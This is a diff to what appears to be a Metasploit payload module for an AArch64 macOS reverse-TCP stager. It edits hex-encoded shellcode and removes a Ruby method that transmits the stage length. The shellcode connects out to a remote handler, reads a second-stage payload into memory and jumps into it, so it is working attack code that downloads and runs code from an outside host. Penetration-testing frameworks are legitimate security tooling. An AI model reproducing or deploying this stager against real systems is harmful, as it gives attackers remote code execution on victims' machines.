@@ -35,11 +35,11 @@ module MetasploitModule
             0xd2800c30,          #  mov	x16, #0x61                  	// #97
             0xd4000001,          #  svc	#0x0
             0xaa0003ec,          #  mov	x12, x0
-            0x100005a1,          #  adr	x1, cc <sockaddr>
+            0x100004e1,          #  adr	x1, b4 <sockaddr>
             0xd2800202,          #  mov	x2, #0x10                  	// #16
             0xd2800c50,          #  mov	x16, #0x62                  	// #98
             0xd4000001,          #  svc	#0x0
-            0x350004c0,          #  cbnz	w0, c0 <failed>
+            0x35000400,          #  cbnz	w0, a8 <failed>
             0xaa0c03e0,          #  mov	x0, x12
             0xd10043ff,          #  sub	sp, sp, #0x10
             0x910003e1,          #  mov	x1, sp
@@ -47,12 +47,12 @@ module MetasploitModule
             0xd2800070,          #  mov	x16, #0x3                   	// #3
             0xd4000001,          #  svc	#0x0
             0xb100041f,          #  cmn	x0, #0x1
-            0x540003c0,          #  b.eq	c0 <failed>
+            0x54000300,          #  b.eq	a8 <failed>
             0xb94003e2,          #  ldr	w2, [sp]
             0xd34cfc42,          #  lsr	x2, x2, #12
             0x91000442,          #  add	x2, x2, #0x1
             0xd374cc42,          #  lsl	x2, x2, #12
-            0x100003c0,          #  adr	x0, d4 <next_stage>
+            0x10000300,          #  adr	x0, bc <next_stage>
             0xd34cfc00,          #  lsr	x0, x0, #12
             0x91000400,          #  add	x0, x0, #0x1
             0xd374cc00,          #  lsl	x0, x0, #12
@@ -65,10 +65,10 @@ module MetasploitModule
             0xd2800070,          #  mov	x16, #0x3                   	// #3
             0xd4000001,          #  svc	#0x0
             0xb100041f,          #  cmn	x0, #0x1
-            0x540000c0,          #  b.eq	c0 <failed>
+            0x540000c0,          #  b.eq	a8 <failed>
             0x8b000063,          #  add	x3, x3, x0
             0xeb000084,          #  subs	x4, x4, x0
-            0x54fffee1,          #  b.ne	90 <read_loop>
+            0x54fffee1,          #  b.ne	78 <read_loop>
             0xf94003e0,          #  ldr	x0, [sp]
             0xd63f0000,          #  blr	x0
             0xd2800000,          #  mov	x0, #0x0                   	// #0
@@ -79,12 +79,6 @@ module MetasploitModule
           ].pack("V*")
         }
       ))
-  end
-
-  def handle_intermediate_stage(conn, payload)
-    print_status("Transmitting stage length value...(#{payload.length} bytes)")
-    conn.put( [ payload.length ].pack('V') )
-    return true
   end
 
 end
